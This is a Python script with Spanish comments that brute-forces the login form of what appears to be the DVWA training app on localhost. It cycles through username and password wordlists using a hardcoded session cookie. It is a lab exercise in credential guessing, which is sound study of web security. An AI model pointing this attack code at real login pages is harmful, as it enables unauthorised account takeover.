import requests

# URL del formulario
url = "http://localhost:8080/vulnerabilities/brute/"

# Cabeceras HTTP
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Cookie': 'PHPSESSID=0req2nq6b9gtalsdel7fhsjfj7; security=low',
    'Content-Type': 'application/x-www-form-urlencoded',
}

# Cargar usuarios y contraseñas
with open('fiveusernames.txt', 'r') as user_file:
    usernames = [line.strip() for line in user_file]

with open('millionpasswords.txt', 'r') as pass_file:
    passwords = [line.strip() for line in pass_file]

# Intentar cada combinación
for username in usernames:
    for password in passwords:
        # Parámetros de la solicitud
        params = {
            'username': username,
            'password': password,
            'Login': 'Login',
        }

        # Enviar la solicitud GET
        response = requests.get(url, headers=headers, params=params)

        # Comprobar si la respuesta no contiene el mensaje de error
        if "Username and/or password incorrect." not in response.text:
            print(f"¡Login exitoso! Usuario: {username} | Contraseña: {password}")
            break  # Detener una vez encontrado el login correcto
